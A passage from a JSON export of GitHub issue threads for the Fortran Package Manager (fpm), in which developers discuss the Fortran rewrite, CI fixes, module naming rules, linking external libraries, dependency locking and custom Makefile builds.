                    "user": "certik",
                    "date": "2020-07-21 17:59:20+00:00",
                    "text": "That's fine with me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:23:37+00:00",
                    "text": "To the extent we can, the tests should read very much like the spec. But I am in favor of starting with a spec right now, mostly because I believe there are aspects of the Haskell version that do not function exactly as we want. We should have a discussion about how to handle these situations before we start writing the tests."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 06:29:15+00:00",
                    "text": "I agree: having worked with fpm a bit more, I see how it works currently\nand how it sometimes conflicts with things I am used to. It is not so bad\nthat fpm enforces a particular practice, but it should be clear what it\naccepts and that should match our intentions.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 21:23 schreef Brad Richardson <\nnotifications@github.com>:\n\u2026\n To the extent we can, the tests should read very much like the spec. But I\n am in favor of starting with a spec right now, mostly because I believe\n there are aspects of the Haskell version that do not function exactly as we\n want. We should have a discussion about how to handle these situations\n before we start writing the tests.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#133 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRY7GDQKFTCYFW3S2GTR4XTMVANCNFSM4PDXFU6A>\n ."
                }
            ]
        },
        {
            "number": 132,
            "user": "certik",
            "date": "2020-07-21 15:28:57+00:00",
            "title": "Fix tests on macOS",
            "text": "It turns out there were several problems on the macOS runner, all of which this PR fixes:\n\nthe download of the Haskell binary failed due to some SSL handshake error\nthe \"bin\" directory which would host the stack binary does not exist\nthe gfortran binary is no longer pre-installed on macOS (only gfortran-9)\n\nFixes #134.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 17:46:52+00:00",
                    "text": "@everythingfunctional you might want to figure out how to install Haskell on macOS, right now I just downloaded the macOS tarball on my linux, uploaded it to a gist, and let it download from the gist by the CI, so that it works, as we need the CI to be working."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:20:24+00:00",
                    "text": "I don't have access to a mac to test this out, but I suspect it is something that the stack maintainers will fix. They're install script is supposed to support most platforms."
                }
            ]
        },
        {
            "number": 131,
            "user": "certik",
            "date": "2020-07-21 15:11:33+00:00",
            "title": "Initial Fortran infrastructure",
            "text": "This PR moves the Haskell version into a bootstrap directory and creates a new fpm package called fpm, which is the Fortran based fpm. For now the Fortran fpm is just the default \"new\" template, but I modified the print statement. The important part is that it is tested by the CI to build and run on all platforms (Linux, macOS and Windows). This provides the initial infrastructure needed so that others can now start working on the Fortran based fpm, and things will get tested by the CI. Once this is merged, we can send subsequent PRs to depend on other Fortran fpm packages for command line, internet access etc., and slowly start building the functionality that we need.\nPlan for this PR:\n\n Move Haskell based version to a dedicated directory (CI test still builds and tests this version)\n Add initial Fortran version as an fpm package\n\n Make CI test to build the Fortran version using the Haskell version\n\n\n\nEverything that I wanted to get done is implemented. This is ready for review.\nFixes #124.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 15:40:40+00:00",
                    "text": "The macOS failure is unrelated (#134)."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 18:58:42+00:00",
                    "text": "The CI gave me a lot of issues today, but I finally got everything building and passing on all platforms. This is ready for review."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 19:29:19+00:00",
                    "text": "Thanks @everythingfunctional for the review. If it looks good to you, then I am going to go ahead and merge this, so that we can start improving various parts of this in subsequent PRs."
                }
            ]
        },
        {
            "number": 130,
            "user": "milancurcic",
            "date": "2020-07-21 15:09:02+00:00",
            "title": "Catch module+program or multiple modules in a source file and print a helpful message to the user",
            "text": "See #126. fpm currently allows either a single module or a single program in a source file. However, Fortran allows having:\n\nMultiple modules per source file\nModule + program in a source file\nProcedures without modules in a source file\n\nfpm should catch these scenarios and print a helpful error message for the user.",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 06:21:28+00:00",
                    "text": "Just a comment: I noticed that fpm does allow more than one module in a file - and it seems to work: one of the source files I experimented with has a small module to define a type and then a module with the same name as the source file that uses it. So not two independent ones, I agree."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:46:10+00:00",
                    "text": "For simplicity, I think by default fpm should simply expect one module per file, and impose the naming consistency convention. We can discuss if we should implement optional options in fpm.toml to allow more modules per file."
                }
            ]
        },
        {
            "number": 129,
            "user": "milancurcic",
            "date": "2020-07-21 15:04:59+00:00",
            "title": "Handle module name - source file name mismatch and print helpful message to the user",
            "text": "See #128. Currently fpm does not help the user figure out what went wrong if the module name / file name convention is not followed. fpm should detect this and print a helpful message to the user, for example:\nfpm error: I noticed that you defined a module `my` in file `src/mx.f90`. The module name must match the source (path) name. Either rename your module to `mx`, or place it in `src/my.f90`.\n\nor similar.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 12:16:41+00:00",
                    "text": "This might be fixed with #213."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:17:19+00:00",
                    "text": "Correct, the bootstrap version is no longer enforcing any match between module and source file name."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 20:19:28+00:00",
                    "text": "Closing this issue as resolved by #213."
                }
            ]
        },
        {
            "number": 128,
            "user": "arjenmarkus",
            "date": "2020-07-21 09:19:20+00:00",
            "title": "Implicit relationship between the names of a module and the source file that contains it assumed",
            "text": "I have run into a problem that is illustrated with the attached project:\n`\n$ d:/fortran/fpm/fpm.exe build\ngfortran (for build/gfortran_debug/mxmy/mx.o build/gfortran_debug/mxmy/mx.mod)\nfpm.exe: Error when running Shake build system:\nat want, called at src\\Build.hs:205:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n\nDepends on: build/gfortran_debug/mxmy/libmxmy.a\nat need, called at src\\Build.hs:203:13 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\nDepends on: build/gfortran_debug/mxmy/mx.o\nat &%>, called at src\\Build.hs:183:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\nDepends on: build/gfortran_debug/mxmy/mx.o build/gfortran_debug/mxmy/mx.mod\nat error, called at src\\Development\\Shake\\Internal\\Rules\\Files.hs:245:13 in shake-   0.18.5-7VS8ovPeUeSCopHgkQQ1Vu:Development.Shake.Internal.Rules.Files\nRaised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\nbuild/gfortran_debug/mxmy/mx.o\nbuild/gfortran_debug/mxmy/mx.mod - MISSING\n`\n\nThe source file is called \"mx.f90\" but it contains a module \"my\". Apparently this is not currently supported, whether by design or otherwise. It seems to me to be a bug.\ntest-fpm-mxmy.zip",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:51:12+00:00",
                    "text": "Hi Arjen, yes, it's by design, see https://github.com/fortran-lang/fpm/blob/master/PACKAGING.md#single-module-library.\nThe rationale is that if we have higher constraints on the user application or library structure, we can design a more robust build system that has a \"sane default\" with fewer edge cases.\nDo you think the packaging guide could be improved in any way?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:55:06+00:00",
                    "text": "However, the unhelpful response from fpm is not by design, but is due to this exception handling not being implemented. In scenarios like this fpm must be helpful to the user, for example:\nfpm error: I noticed that you defined a module `my` in file `src/mx.f90`. The module name must match the source (path) name. Either rename your module to `mx`, or place it in `src/my.f90`.\n\nor similar."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 14:56:14+00:00",
                    "text": "Yes, the default layout that fpm expects is on purpose restricted, similar to how Cargo does it. The module names must be consistent with the filename.\nHowever, I am all for allowing exceptions, which you could specify by hand in fpm.toml. We should do that.\nThe error message is not helpful. But we should work on fixing both of these things in the Fortran implementation (see #124)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 15:02:18+00:00",
                    "text": "It is not criticism :) - just a user experience. I understand the\nlimitations, but an innocent user may run into this sort of things and not\nbe able to pinpoint the cause (as I was not with my other problem).\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 16:56 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Yes, the default layout that fpm expects is on purpose restricted, similar\n to how Cargo does it. The module names must be consistent with the filename.\n\n However, I am all for allowing exceptions, which you could specify by hand\n in fpm.toml. We should do that.\n\n The error message is not helpful. But we should work on fixing both of\n these things in the Fortran implementation (see #124\n <#124>).\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#128 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5JSM22HTKDFHJED3TR4WUB7ANCNFSM4PDLQ2RQ>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 15:11:32+00:00",
                    "text": "@certik I opened #129 and #130 to track these specific exception handling and error message issues.\nI also created the fpm-fortran tag so that we can tag any issue to be specific to the Fortran implementation and not Haskell. You'll notice that I didn't initially tag #129 and #130 as fpm-fortran, as I'm unsure whether we should leave these unattended for a long time before fpm-fortran is up to speed. I think they're quite critical UI issues."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 19:27:12+00:00",
                    "text": "And I implemented the initial infrastructure for Fortran at #131 to start getting things moving."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 12:17:27+00:00",
                    "text": "This might be fixed with #213."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-02 20:18:31+00:00",
                    "text": "The bootstrap version is no longer enforcing any match between module and source file name."
                }
            ]
        },
        {
            "number": 127,
            "user": "urbanjost",
            "date": "2020-07-19 12:33:17+00:00",
            "title": "Should fpm automatically make stdlib available, plus some notes on trying the fpm prototype",
            "text": "July 18, 2020\n\n[  ]  I think stdlib should be available via fpm and possibly included by default. It would\nbe a shame if there were not some integration between the projects.\n\nA few comments on fpm (Fortran Package Manager)\n\n\nI could not find a way using \"fpm build\" or \"fpm run\" to work with\nprograms that required external libraries (not always available\nstatically) like X11 Windows and ncurses and various math libraries\ninstalled on my machine. Is there some description of how to set\ncompiler options I missed?\n\n\nI could not get an \"fpm\" command to recognize any compiler except\ngfortran(1).\n\n\nSome type of \"install\" mode is highly desirable to place files in a single location.\nIt should include some way to handle data and documentation files\nas well as the *.a and *.mod files and executables. Otherwise, seperate program\ndevelopment ends up producing a lot of duplication if each program requires the\nsame packages, or you are forced to keep all development in the same file tree.\n\n\nFor builds that build many programs having to put each one in a seperate directory\ncreates a very awkward file layout. Some type of option for executables where\nyou could give a list of specific files to use for building a program might be\na solution. Automatically assuming all files at or below the path is not always\ndesirable even though it makes some cases very simple to configure.\n\n\nThe \"run\" subcommand is fine for a single program, but if you have a number of\ntests or programs it would be nice if it had a \"list\" option.\n\n\nbeing able to search and list entries in a central registry is apparently planned (?)\nbut it would at least be nice if\npackages listed at\nhttps://fortran-lang.org were marked as to whether fpm support\nwas enabled.  As a substitute for a search/list feature I did a\nglobal search (on just github) of the filename \"fpm.toml\" and at\nleast on that site there were not many hits, so maybe this is too\nearly anyway.\n\n\nThe install of fpm(1) required way too much infrastructure. A Fortran-based version\nis planned?\n\n\nHere is a list of my public repositories that are fpm-enabled:\n\n    [dependencies]\n    # worked well with simple single-module projects\n     M_kracken95   = { git = \"https://github.com/urbanjost/M_kracken95.git\" }\n     M_cli         = { git = \"https://github.com/urbanjost/M_cli.git\"  }\n     M_calculator  = { git = \"https://github.com/urbanjost/M_calculator.git\" }\n     M_change      = { git = \"https://github.com/urbanjost/M_change.git\" }  \n     M_color       = { git = \"https://github.com/urbanjost/M_color.git\" }\n     M_history     = { git = \"https://github.com/urbanjost/M_history.git\" }\n     M_io          = { git = \"https://github.com/urbanjost/M_io.git\" }\n     M_msg         = { git = \"https://github.com/urbanjost/M_msg.git\" }\n     M_time        = { git = \"https://github.com/urbanjost/M_time.git\" }\n     M_strings     = { git = \"https://github.com/urbanjost/M_strings.git\" }\n     # uses ISO_C_BINDING but no C wrapper code. fpm(1) worked well\n     M_process     = { git = \"https://github.com/urbanjost/M_process.git\" }\n     #\n     # required creating makefiles:\n     M_system      = { git = \"https://github.com/urbanjost/M_system.git\" }\n     # this did not work satisfactorily ...\n     M_draw        = { git = \"https://github.com/urbanjost/M_draw.git\" }\n\nFor projects not requiring other libraries or C wrappers and just comprised of\na few modules I had no problems.\nAs soon as I needed some C wrappers or needed to build A C library as part of\nthe project it got very difficult. I really could not come up with a satisfactory\nbuild of the M_draw.f90 module, as it requires data files and C routines; and I\ntried a lot of variations. It is not clearly shown in the documentation just how\nyou can use a customized build script or makefile and still have it work cleanly\nwith fpm.\n\n\nInitializing an existing .git directory with \"fpm init\" was problematic as it\nalways tries to initialize git and overwrites README.md. To use \"fpm\ninit\" required Moving the original directory; making new one with\n\"fpm init\"; removing .git and them moving files back.  Would be\nnice if instead of the \"Jane Doe\" fpm.toml file created that it\nuse names from .gitconfig for initial values, and not overwrite\nexisting files like README.md or initialize git(1) if .git exists\nif you run it in an existing directory.\n\n\nIt should at least be noted in the documentation that there is no \"fpm clean\"\noption\n\n\n.F90 files appear to be supported, but with no way to specify preprocessor\noptions; since preprocessors vary between compilers this could get complicated\nbut I was wondering whether a specific preprocessor would be supported in the\nfuture and how options can be passed to one now.\n\n\nIt was easier to just create a Makefile for any legacy codes with routines not\nin modules or when C wrappers were needed, but worked quite well for single-module\nprojects. It was nice to be able to write a program that needed access to file\nsystem information, manipulated strings, printed date and time information and",
            "comments": []
        },
        {
            "number": 126,
            "user": "arjenmarkus",
            "date": "2020-07-18 15:11:25+00:00",
            "title": "Complaints about recursive rules",
            "text": "I tried to use fpm on a somewhat more complex collection of Fortran modules and their test programs. They are all part of my Flibs project (http://flibs.sf.net). I copied the source files for the modules to a directory src and the sources for the test programs to test/xxx (well, for two test programs, to get started). Then I set up a fpm.toml file. All have been attached.\nfpm gave me an error message:\nBuild system error - recursion detected:\nKey type:   FilesQ\nKey value:  build/gfortran_debug/computing/combinations.o build/gfortran_debug/computing/combinations.mod\nRules may not be recursive\nAs all the modules are standalone I am not sure what went wrong. Also, I noticed that with my first attempt it complained about a different (!) module than when I redirected the output.\nIt may be that the problem has already been solved - my version of fpm is one month old.\ntest-fpm-flibs.zip",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:25:52+00:00",
                    "text": "Some of the source files contain a program at the end which uses the module. This use statement signals to the fpm build system that the module depends on itself. Thus, the recursive rule error message.\nBasic fix, remove the example programs from the end of the module source files."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 06:34:17+00:00",
                    "text": "Hi Brad,\n\noh, I will have to check that - I was rather certain there was nothing like\nthat ... Thanks for looking into this.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 01:26 schreef Brad Richardson <\nnotifications@github.com>:\n\u2026\n Some of the source files contain a program at the end which uses the\n module. This use statement signals to the fpm build system that the module\n depends on itself. Thus, the recursive rule error message.\n\n Basic fix, remove the example programs from the end of the module source\n files.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#126 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRYYYOIWSM7W3KDR5WLR4THA3ANCNFSM4PAASMNA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 09:15:18+00:00",
                    "text": "Yes, two of the source files contained a test program (I should have a look at those :)). But when I removed them and tried again, I ran into another issue: a presumed relation between the names of the module and the source file that contains it. I will report it as a separate issue."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:57:56+00:00",
                    "text": "Especially because this (module + program in a source file) is valid, fpm needs to be able to detect this and print a helpful message to the user."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 15:03:58+00:00",
                    "text": "Yes, the error message was puzzling. If you know the design decisions\nand usage constraints it is probably easy enough to locate the cause,\nbut for a novice user it will not immediately be clear.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 16:58 schreef Milan Curcic <notifications@github.com>:\n\u2026\n\n Especially because this (module + program in a source file) is valid, fpm needs to be able to detect this and print a helpful message to the user.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                }
            ]
        },
        {
            "number": 125,
            "user": "arjenmarkus",
            "date": "2020-07-17 07:42:10+00:00",
            "title": "Not so trivial program: Fortran with a bit of C and a prebuilt library",
            "text": "After this month's call, I looked for a small but not entirely trivial program to try fpm with (not trivial in the sense that it consists of several source files, rather than a single one). I found one that is a trifle more complex than any of the examples I have seen and I would like advice on how to deal with it:\n\nIt consists of several Fortran source files and a single C source file\nSome of the Fortran source files require preprocessing (the extension is .F90, so some compilers will do that automatically)\nThe program needs to be linked to a (C) library that has been installed on the system\n\nThe trivial way I build it is via a bunch of compile commands with the required options, so ultimately that could function as a custom build script, but the above set-up seems a fairly common situation.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-17 19:58:55+00:00",
                    "text": "With current functionality, your only option for this is a custom build script. At some point in the future we'll have the capabilities built into fpm to handle linking to a system library and (hopefully) compiling C code, but we aren't there yet."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-18 14:06:12+00:00",
                    "text": "I understand - I already thought that would be the answer :). Consider it another likely scenario that - at some point in time - needs to be supported.."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:46:48+00:00",
                    "text": "This should be possible with Fortran fpm now, as we support compiling C code there and linking with external libraries."
                }
            ]
        },
        {
            "number": 124,
            "user": "certik",
            "date": "2020-07-16 22:11:29+00:00",
            "title": "Create the infrastructure for the Fortran version",
            "text": "Per our discussion on the phone call:\n\nUse this repository\ncreate a directory \"fortran\" and \"haskell\" (we can call it differently) and put the haskell version into the \"haskell\" directory and start a Fortran version in the \"fortran\" directory\nUse fpm to build the \"fortran\" directory --- it will be just an fpm package\nEnsure haskell fpm can build it\nReuse the test suite for both haskell and fortran\n\nThis is probably the highest priority issue now so I pinned it.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 18:59:55+00:00",
                    "text": "I think the PR #131 that I just finished fixes this issue."
                }
            ]
        },
        {
            "number": 123,
            "user": "certik",
            "date": "2020-07-16 20:07:51+00:00",
            "title": "Allow to generate a standalone tarball with all dependencies",
            "text": "fpm should have a feature like fpm tarball --include-deps that will create a tarball of the current fpm package together with all dependencies and a build system such as CMake (#69), so that one can unpack this tarball at a machine without internet connection, and build everything from scratch (all the dependencies and the main application).\nThere are many usages of this feature:\n\nan application that must run on an HPC machine without internet connection, and I want to distribute it as a tarball that is built using cmake (a common expectation)\nfpm itself --- we can distribute fpm source code like this, and anybody with cmake can then build it from source (no other dependencies needed)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-22 08:28:51+00:00",
                    "text": "I was trying to figure out what it takes to implement a command like this, but there are a some things that are unclear. First, I would propose to name the command fpm dist rather than fpm tarball.\nThe second thing that comes to mind is, in case we use fpm dist --cmake and generate a CMake based build system, how do we make CMake fetch the dependencies? FetchContent works fine, but only if the upstream project supports CMake as well.\nOn solution would be to rely on a release artefact created by fpm and uploaded somewhere instead of the default git-archive.\nFinally, how do we handle the case of fpm dist --cmake --include-deps? Of course we can recursively generate the CMake files for all the projects and include them in a tarball, but some dependencies come with their own CMake files, would we overwrite (maybe with a fpm dist --cmake --include-deps --overwrite)?\nAs a note, in case anyone wants to give this a real try. Implementing a fpm dist --meson will probably be way less painful than implementing robust CMake."
                }
            ]
        },
        {
            "number": 122,
            "user": "ivan-pi",
            "date": "2020-07-16 19:20:29+00:00",
            "title": "Have fpm define precision",
            "text": "Recent Fortran language resources usually recommend defining a module with constants defining the precision that are later reused throughout the code, for example:\nmodule precision\n  integer, parameter :: sp = kind(1.0)\n  integer, parameter :: dp = kind(1.0d0)\n  integer, parameter :: wp = dp\nend module\nThese kinds of modules are duplicated throughout libraries. This can potentially lead to incompatibilities, i.e. if library 1 uses single precision as default, and library 2 uses double precision. The user is then faced with the problem of either adapting library 1, or making library 2 use the precision module from library 1.\nWould it make sense to have some mechanism to give fpm the \"power\" of enforcing a certain default precision? Hopefully in the long-term most Fortran programmers would default to just using constants from the stdlib precision module. This might not always be enough (i.e. interfacing with C, or perhaps using fpm on some non x86_64 architectures).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-16 19:25:27+00:00",
                    "text": "Great question. I don't know, I am hoping we will encourage the community to use stdlib to get precision. Fpm has the \"power\" to do anything, but the question is how it would work and if it makes sense. Like the promoting of single precision to double?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-17 09:46:23+00:00",
                    "text": "Yes, the entire situation is kind of messy. I have seen some codes which rely on the compiler flags such as -fdefault-real-8 to automatically upgrade real literals such as 1.0 to double precision.\nIn the Fortran METIS interface I used the C preprocessor:\n#ifdef REAL64\n    integer, parameter, public :: real_t = c_double\n#else\n    integer, parameter, public :: real_t = c_float\n#endif\nto allow users to select the precision depending on the version of METIS installed on their system.\nI think it would be good if we could establish some guidelines for package developers whether such precision choices are responsibility of the package developer or the package user, and whether it should be done by 1) a preprocessor (C, fypp) + build system, or 2) the package manager."
                }
            ]
        },
        {
            "number": 121,
            "user": "MarkWieczorek",
            "date": "2020-07-15 21:46:49+00:00",
            "title": "github dependencies are never updated",
            "text": "One method for downloading dependencies is to specify a github project, and optionally a specific branch, tag, or commit. However, once the entire git project is cloned, it is never updated.\nAn option should be provided to allow to update the dependencies when they change at github. In my opinion, if a specific tag or commit is not specified, the default behavior should in fact be to check for updates automatically.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-15 23:16:10+00:00",
                    "text": "Actually I think we should do it like Cargo --- fpm determines a particular version that satisfies your fpm.toml, and generates fpm.lock. Then it never checks or updates any dependencies, it simply uses fpm.lock which has the exact dependency pinned down. But you can run fpm update command that will update your dependencies (and updates your fpm.lock file). More info:\nhttps://doc.rust-lang.org/cargo/commands/cargo-update.html"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 23:47:29+00:00",
                    "text": "Right now it's not doing anything to check that the version that is there is the right version, that it was cloned and checked-out correctly, etc, just that there is something there.\nWe haven't come up with a coherent strategy for version constraint checking, let alone version constraint solving, so I've just punted on doing anything for now. We'll probably look at what Cargo's solution was.\nThe solution that @certik described is what many (most?) language specific package managers have settled on. It prevents things in your code from breaking randomly because somebody pushed a bug to their repository."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-16 09:27:03+00:00",
                    "text": "A related feature request is the following: Instead of cloning the entire repo, it would be useful in many instances (to speed up the download process) to only do a shallow clone (with git clone --depth=1). I'm not sure what the default beviour should be, but it would be useful to at least have the option."
                }
            ]
        },
        {
            "number": 120,
            "user": "MarkWieczorek",
            "date": "2020-07-14 12:30:13+00:00",
            "title": "\"name\" should not be a required fpm.toml keyword for files that do not link to an fpm library",
            "text": "In the current configuration, it is necessary to specify a name keyword at the top of the fpm.toml file. This name is used to name the directory that contains the .mod, .a, and .o files that are used to generate a static library.\nHowever, if you have a project with only a single file in the app folder, there is no need to have a src folder nor to compile a library at all. In this case, however, if you omit the name keyword, fpm will exit with the error tomland decode error:  Key name is not found\nFurthermore, in my opinion, the name keyword should not be at the head of the file, but should more logically be under the [library] heading, as this is where all the information about the compiled archive is listed. (This would be analogous to name in [[executable]]).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-14 15:48:46+00:00",
                    "text": "If you create a new package with Cargo, say cargo new y, then you get the following Cargo.toml:\n[package]\nname = \"y\"\nversion = \"0.1.0\"\nauthors = [\"Ond\u0159ej \u010cert\u00edk <ondrej@certik.us>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\n\nSo the name is simply the name of the package. Even if it is just a simple executable. So I think the name should stay, it's the name of the project."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:36:06+00:00",
                    "text": "name is used as the default for many things, so you do need it. Otherwise, you'd need to be explicit about everything and likely repeat yourself, which we're trying to avoid for common use cases."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 17:05:03+00:00",
                    "text": "If that is the case, shouldn't\n[[executable]]\nname =\n\nbe set by default to name? If you don't set the executable name, you get a similar error.\nEncountering this project for the first time, it wasn't really obvious what the parameters in the fpm.toml file mean. In addition to this, there is also\n[library]\nsource-dir\n\nwhich is the directory for files used to compile .mod and .a files. However\n[[executabe]]\nsource-dir\n\nCorresponds only to the name of the directory in build/gfortran_debug  where you find the compiled executable."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 18:22:59+00:00",
                    "text": "Yeah, we haven't worked through all of the possible combinations of fpm.toml inputs and under what combinations defaults should work. For example\n[[executable]]\nsource-dir = \"app1\"\nshould probably work with the \"defaults\" for name and main, but\n[[executable]]\nsource-dir = \"app1\"\n\n[[executable]]\nsource-dir = \"app2\"\nwould need to complain about conflicting names for the executables.\nThe documentation almost certainly needs work and clarification."
                }
            ]
        },
        {
            "number": 119,
            "user": "MarkWieczorek",
            "date": "2020-07-14 12:16:41+00:00",
            "title": "Link to precompiled system-wide archives",
            "text": "fpm is great for including external fortran projects as dependencies (typically downloaded at github).\nHowever, it often arises that a fortran project needs to link to an already compiled system-wide archive, such as lapack or fftw. At present, to the best of my knowledge, there is no simple way to link to such files in fpm. It is possible that this might be possible using a Makefile, but that would be non-optimal.\nIdeally, the libraries to link to would be placed in the fpm.toml file,  something like this:\nlink = 'fftw, lapack'",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:13:16+00:00",
                    "text": "This is certainly on our radar. We just haven't gotten to it yet."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-30 22:11:16+00:00",
                    "text": "Since we flagged this for our first beta release, we should agree on a syntax for it.\nI would suggest to include the external libraries in the build section:\n[build]\nlink = [\"fftw\", \"lapack\"]\nWhich would translate to\ngfortran ... -lfftw -llapack\n\nin the link line.\nTo group libraries in the link line nested arrays could be used."
                }
            ]
        },
        {
            "number": 118,
            "user": "MarkWieczorek",
            "date": "2020-07-10 21:14:34+00:00",
            "title": "Compile archive using pre-existing Makefile",
            "text": "I have a somewhat complicated archive that is compiled with a pre-existing Makefile, and I would like to make this more accessible to those who might want to use it as a fpm dependency.\nBased on the documentation, I thought that I would just need to specify the name of the Makefile in the fpm.toml file, but this obviously didn't work.\nI think that it would be very useful for fpm to have have the option of simply executing a pre-existing makefile, and then placing the compiled .mod and .a files wherever it is that they are needed. Ideally, this would be specified in the fpm.toml file something like this:\n[library]\nmakefile = \"make all F95=$(FC) DIR=$(BUILD_DIR)\"\n\nAlternatively, given that the .mod and .a files are initially found in the src directory, instead of having the makefile manually move them to $(BUILD_DIR), this could be done by fpm itself after the makefile successfully terminates.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-11 00:33:19+00:00",
                    "text": "We certainly want to try and make migrating existing projects to fpm as easy as possible. The questions that need to be answered to solve this problem are:\n\nHow does fpm figure out how to call the makefile? You're example shows something that might be workable\nHow does fpm figure out where the makefile put the stuff it needs to copy? This one's a bit harder\n\nOn the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands. It's a tad less portable, but a pretty straightforward workaround."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-11 09:40:46+00:00",
                    "text": "On the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands.\n\nIs it possible for fpm to run a script now (without compiling files) ? That would probably work for me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-13 14:45:56+00:00",
                    "text": "@MarkWieczorek, yes. Check out the details here. Let us know if anything is unclear or you get stuck."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-13 20:52:32+00:00",
                    "text": "I am starting to make some progress.\nFirst, it turns out that if you have your own Makefile from a pre-existing project\n[library]\nsource-dir=\"src\"\nbuild-script = \"make all\"\n\nand\n[library]\nsource-dir=\"src\"\nbuild-script = \"Makefile\"\n\ndo not do the same thing. The first example actually does what I want (i.e., just do a make all in shell) but the second seems to try compile my source files using fpm.\nSecond, if you exclude the src-dir line, the following doesn't work as expected:\n[library]\nbuild-script = \"make all\"\n\nThis suprises me, because fpm doesn't need to know where my source files are, given that everything is to be compiled by my pre-existing makefile.\nI think that part of the solution will be to refactor the documentation, and describe what is actually happening with the above commands. It would be very useful to have a section in the documentation describing how to port a pre-existing project to fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-07-13 20:54:57+00:00",
                    "text": "We should have tests for all of the above, then it will at least be clear what is supposed to work."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-13 21:25:29+00:00",
                    "text": "One final thing:\nEverything works when using\nname = \"project\"\n[library]\nsource-dir=\"src\"\nbuild-script=make all F95=$FC\n\nHowever,  fpm build ends with the error/warning\nmake: *** No rule to make target `/path/build/gfortran_debug/project/libproject.a'.  Stop.\n\nThis is because (as stated in the docs) \"Additionally, script will be called with the name of the archive (*.a file) that should be produced as the command line argument.\"\nIs there a way to disable this behavior?"
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 11:52:41+00:00",
                    "text": "I've encountered one final problem, which unfortunately is the most important for me.\nFirst, I can successfully compile my project locally using a pre-existing makefile, as described above. The makefile moves all the .mod and .a files to BUILD_DIR, which is located in the main directory at\ngfortran_debub/project/\n\nHowever, if I try to use my project as a dependency (downloaded from github) in another project, the .mod and .a files are located at\nbuild/dependencies/project/build/gfortran_debug/project/\n\nand the following directory is empty:\nbuild/gfortran_debug/prioject/\n\nWhen building the code that makes use of the dependencies, fpm can no longer find where the dependency .a and .mod files are located.\nDoes anyone have any ideas on how to solve this problem? Obviously the files from build/dependencies/project/build/gfortran_debug/project/ need to be copied to build/gfortran_debug/prioject/, but I don't see how to do this."
                },
                {
